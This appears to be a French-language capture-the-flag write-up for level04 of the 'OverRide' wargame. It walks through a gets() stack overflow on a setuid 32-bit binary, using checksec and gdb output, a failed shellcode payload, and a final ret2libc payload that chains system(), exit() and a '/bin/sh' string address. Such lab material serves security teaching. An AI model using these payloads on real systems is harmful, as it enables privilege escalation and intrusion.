# level04

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04

level04@OverRide:~$ file level04 
level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
```

Dans le gets, nous ecrasons save eip a partir de 156 characteres:
=> 0x0804875e <+150>:   call   0x80484b0 <gets@plt>
(gdb) x/wx $esp
0xffffd490:     0xffffd4b0
(gdb) x/s 0xffffd4b0
0xffffd4b0:      ""
(gdb) info frame
Stack level 0, frame at 0xffffd550:
 eip = 0x804875e in main; saved eip 0xf7e45513
 Arglist at 0xffffd548, args: 
 Locals at 0xffffd548, Previous frame's sp is 0xffffd550
 Saved registers:
  ebx at 0xffffd540, ebp at 0xffffd548, edi at 0xffffd544, eip at 0xffffd54c
(gdb) p/d 0xffffd54c-0xffffd4b0
$1 = 156

level04@OverRide:~$ (python -c 'print "\x90" * (156-64) + "\x2b\xc9\x83\xe9\xf6\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xf3\x43\x6c\x98\x83\xee\xfc\xe2\xf4\x99\x48\x34\x01\xa1\x25\x04\xb5\x90\xca\x8b\xf0\xdc\x30\x04\x98\x9b\x6c\x0e\xf1\x9d\xca\x8f\xca\x1b\x40\x6c\x98\xf3\x30\x04\x98\xa4\x10\xe5\x79\x3e\xc3\x6c\x98" + "\x75\xd7\xff\xff"';cat) | ./level04 
Give me some shellcode, k
no exec() for you

Nous ne pouvons pas utiliser la fonction exec(), nous pouvons utiliser la technique du retour a la libc, qui consiste a aller chercher dans la memoire deja presente la fonction system, son argument et pourquoi pas son retour, meme si dans notre cas, nous n en avons pas besoin.

(gdb) print system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$3 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

export TMP="/bin/sh";(python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\x54\xdf\xff\xff"';cat) | ./level04

(python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xb7\xd8\xff\xff"';cat) | ./level04
-> La variable d environnement SHELL existe deja !

(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"

(python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"';cat) | ./level04

[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]


